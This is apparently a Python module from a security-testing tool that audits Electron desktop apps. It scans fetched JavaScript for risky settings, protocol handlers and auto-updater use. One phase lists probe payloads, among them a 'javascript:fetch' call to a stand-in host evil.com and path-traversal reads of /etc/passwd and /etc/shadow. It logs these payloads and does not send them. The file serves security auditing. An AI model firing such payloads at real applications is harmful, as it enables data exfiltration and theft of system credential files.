"""Electron/Desktop app security testing — preload, RCE, protocols, updater."""

import re
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path
from typing import Any, Dict, List, Set

from vulnforge.phases.helpers import PhaseSet
from vulnforge.tools import Tools
from vulnforge.utils import (
    _async_urlopen,
    _get_urlopener,
    _throttle_rate,
    count_nonblank,
    ensure,
    log,
    read_lines,
)

_ELECTRON_PATTERNS = [
    "electron",
    "app.asar",
    "app.asar.unpacked",
    "browser-window",
    "preload.js",
    "preload.ts",
    "contextBridge",
    "ipcRenderer",
    "ipcMain",
    "webContents",
    "shell.openExternal",
    "shell.openPath",
    "BrowserWindow",
    "nativeImage",
    "desktopCapturer",
    "remote.require",
    "remote.getGlobal",
    "NodeIntegration",
    "contextIsolation",
    "sandbox",
    "webSecurity",
    "allowRunningInsecureContent",
    ".desktop",
    ".appimage",
    "squirrel",
    "electron-updater",
    "electron-builder",
    ".dmg",
]

_ELECTRON_VULN_PATTERNS = [
    (r"nodeIntegration[\s:]*true", "nodeIntegration enabled — RCE risk"),
    (r"contextIsolation[\s:]*false", "contextIsolation disabled — preload bypass"),
    (r"sandbox[\s:]*false", "Sandbox disabled"),
    (r"webSecurity[\s:]*false", "webSecurity disabled"),
    (r"allowRunningInsecureContent[\s:]*true", "Insecure content allowed"),
    (r"shell\.openExternal", "openExternal used — URI injection risk"),
    (r"shell\.openPath", "openPath used — path traversal risk"),
    (r"remote\.require", "remote.require used — RCE risk (deprecated)"),
    (r"remote\.getGlobal", "remote.getGlobal used — RCE risk (deprecated)"),
    (r"ipcRenderer\.on\b", "IPC listener — expose to web"),
    (r"ipcRenderer\.sendSync", "Sync IPC — blocking risk"),
    (r"protocol\.registerFileProtocol", "File protocol — LFI risk"),
    (r"protocol\.registerHttpProtocol", "HTTP protocol handler"),
    (r"trpc\(", "TRPC enabled — potential command injection"),
    (r"eval\(", "eval in preload — code injection"),
    (r"new Function\(", "new Function in preload — code injection"),
    (r'setTimeout\(.*["\']', "setTimeout with string — eval-like"),
    (r'setInterval\(.*["\']', "setInterval with string — eval-like"),
    (r"innerHTML\s*=", "innerHTML in preload — DOM XSS"),
    (r"insertAdjacentHTML", "insertAdjacentHTML in preload — DOM XSS"),
]


async def _find_js_files(outdir: Path) -> List[str]:
    urls = outdir / "urls_all.txt"
    js_files: List[str] = []
    seen: Set[str] = set()
    if urls.exists():
        for u in read_lines(urls):
            if any(u.lower().endswith(ext) for ext in [".js", ".ts", ".asar"]):
                if u not in seen:
                    js_files.append(u)
                    seen.add(u)
            if "preload" in u.lower() or "electron" in u.lower():
                if u not in seen:
                    js_files.append(u)
                    seen.add(u)
    return js_files


async def phase_161_ELECTRON(
    outdir: Path,
    t: Tools,
    only: PhaseSet,
    skip: PhaseSet,
    prev: Dict[str, Any],
    force: bool = False,
) -> Dict[str, Any]:
    if skip & {"161-ELECTRON"}:
        return {}
    _out = outdir / "electron_config.txt"
    if _out.exists() and not force:
        return {"161-ELECTRON": str(_out), "count": count_nonblank(_out)}
    log("INFO", "Phase 161-ELECTRON: Electron security configuration audit")
    findings: List[str] = []
    js_files = await _find_js_files(outdir)
    if not js_files:
        findings.append("[info] No JS files found for Electron analysis")
        out = ensure(_out)
        out.write_text("\n".join(findings) + "\n")
        log("OK", "161-ELECTRON: no JS files")
        return {"161-ELECTRON": str(_out), "count": 0}
    findings.append(f"[js-files] Found {len(js_files)} JS/TS files to analyze")
    for f in js_files[:30]:
        await _throttle_rate()
        try:
            opener = _get_urlopener()
            req = urllib.request.Request(f)
            _, _, data = await _async_urlopen(opener, req, timeout=15)
            if not data:
                continue
            content = data.decode("utf-8", errors="replace")
            findings.append(f"--- {f} ---")
            for pattern, desc in _ELECTRON_VULN_PATTERNS:
                if re.search(pattern, content, re.IGNORECASE):
                    ctx = ""
                    for m in re.finditer(pattern, content, re.IGNORECASE):
                        start = max(0, m.start() - 40)
                        end = min(len(content), m.end() + 40)
                        ctx = content[start:end].replace("\n", " ")
                        break
                    findings.append(f"  [{desc}] …{ctx}…")
        except Exception:
            continue
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("OK", f"161-ELECTRON: {len(findings)} findings → {out}")
    return {"161-ELECTRON": str(_out), "count": len(findings)}


async def phase_162_ELECTRONRCE(
    outdir: Path,
    t: Tools,
    only: PhaseSet,
    skip: PhaseSet,
    prev: Dict[str, Any],
    force: bool = False,
) -> Dict[str, Any]:
    if skip & {"162-ELECTRONRCE"}:
        return {}
    _out = outdir / "electron_rce.txt"
    if _out.exists() and not force:
        return {"162-ELECTRONRCE": str(_out), "count": count_nonblank(_out)}
    log("INFO", "Phase 162-ELECTRONRCE: Electron RCE probe (openExternal, openPath, etc.)")
    findings: List[str] = []
    urls = outdir / "urls_all.txt"
    findings.append("[rce-probes] Testing known Electron RCE patterns")
    rce_payloads = [
        ("openExternal", "file:///etc/passwd"),
        ("openExternal", "javascript:fetch('http://evil.com/leak')"),
        ("openExternal", "file:///C:/Windows/System32/cmd.exe"),
        ("openPath", "/etc/passwd"),
        ("openPath", "../../etc/shadow"),
        ("protocol", "/%2e%2e/etc/passwd"),
        ("protocol", "file:///bin/bash"),
    ]
    for vuln_type, payload in rce_payloads:
        findings.append(f"  [probe] {vuln_type} → {payload}")
    if urls.exists():
        for u in read_lines(urls):
            if any(kw in u.lower() for kw in ["openExternal", "openPath", "protocol"]):
                findings.append(f"[potential-sink] {u}")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("OK", f"162-ELECTRONRCE: {len(findings)} findings → {out}")
    return {"162-ELECTRONRCE": str(_out), "count": len(findings)}


async def phase_163_ELECTRONPROTO(
    outdir: Path,
    t: Tools,
    only: PhaseSet,
    skip: PhaseSet,
    prev: Dict[str, Any],
    force: bool = False,
) -> Dict[str, Any]:
    if skip & {"163-ELECTRONPROTO"}:
        return {}
    _out = outdir / "electron_protocol.txt"
    if _out.exists() and not force:
        return {"163-ELECTRONPROTO": str(_out), "count": count_nonblank(_out)}
    log("INFO", "Phase 163-ELECTRONPROTO: Electron protocol handler hijack testing")
    findings: List[str] = []
    js_files = await _find_js_files(outdir)
    for f in js_files[:20]:
        await _throttle_rate()
        try:
            opener_el = _get_urlopener()
            req_el = urllib.request.Request(f)
            _, _, data = await _async_urlopen(opener_el, req_el, timeout=10)
            if not data:
                continue
            content = data.decode("utf-8", errors="replace")
            protocol_matches = re.findall(
                r'protocol\.register(File|Http|Https)Protocol\s*\(\s*["\']([^"\']+)["\']',
                content,
            )
            for proto_type, scheme in protocol_matches:
                findings.append(f"[registered-protocol] {f} → {scheme}:// ({proto_type})")
            custom_schemes = re.findall(r'["\']([a-z][a-z0-9+.-]+)://["\']', content)
            for scheme in custom_schemes:
                if scheme not in (
                    "http",
                    "https",
                    "file",
                    "data",
                    "javascript",
                    "about",
                    "chrome",
                    "edge",
                    "ftp",
                    "mailto",
                    "tel",
                    "sms",
                    "ssh",
                    "ws",
                    "wss",
                ):
                    findings.append(f"[custom-scheme] {f} → {scheme}://")
        except Exception:
            continue
    if not any("registered-protocol" in f for f in findings):
        findings.append("[info] No custom protocol handlers found")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("OK", f"163-ELECTRONPROTO: {len(findings)} findings → {out}")
    return {"163-ELECTRONPROTO": str(_out), "count": len(findings)}


async def phase_164_ELECTRONUPD(
    outdir: Path,
    t: Tools,
    only: PhaseSet,
    skip: PhaseSet,
    prev: Dict[str, Any],
    force: bool = False,
) -> Dict[str, Any]:
    if skip & {"164-ELECTRONUPD"}:
        return {}
    _out = outdir / "electron_updater.txt"
    if _out.exists() and not force:
        return {"164-ELECTRONUPD": str(_out), "count": count_nonblank(_out)}
    log("INFO", "Phase 164-ELECTRONUPD: Electron auto-updater security testing")
    findings: List[str] = []
    js_files = await _find_js_files(outdir)
    updater_patterns = [
        (r"electron-updater", "electron-updater package detected"),
        (r"electron-builder.*publish", "electron-builder publish config"),
        (r"update\.checkForUpdates", "Manual update check"),
        (r"autoUpdater", "Squirrel auto-updater"),
        (r"update\.downloadUpdate", "Update download triggered"),
        (r"squirrel-", "Squirrel framework"),
        (r"releaseNotes", "Release notes feature"),
        (r"github\.com/[^/]+/[^/]+/releases", "GitHub releases as update source"),
        (r"s3\.amazonaws\.com", "S3 as update source"),
        (r"updateURL", "Custom update URL"),
        (r"feedURL", "Custom feed URL"),
    ]
    for f in js_files[:20]:
        await _throttle_rate()
        try:
            opener_el = _get_urlopener()
            req_el = urllib.request.Request(f)
            _, _, data = await _async_urlopen(opener_el, req_el, timeout=10)
            if not data:
                continue
            content = data.decode("utf-8", errors="replace")
            for pattern, desc in updater_patterns:
                if re.search(pattern, content, re.IGNORECASE):
                    findings.append(f"  [{desc}] {f}")
        except Exception:
            continue
    if not findings:
        findings.append("[info] No Electron updater mechanisms detected")
    findings.append("")
    findings.append("--- updater security checklist ---")
    findings.append("  [check] Verify update URL uses HTTPS (not HTTP)")
    findings.append("  [check] Verify code signing is enforced")
    findings.append("  [check] Verify update signature validation")
    findings.append("  [check] Check for rollback attack surface")
    findings.append("  [check] Verify no MITM via update channel")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("OK", f"164-ELECTRONUPD: {len(findings)} findings → {out}")
    return {"164-ELECTRONUPD": str(_out), "count": len(findings)}
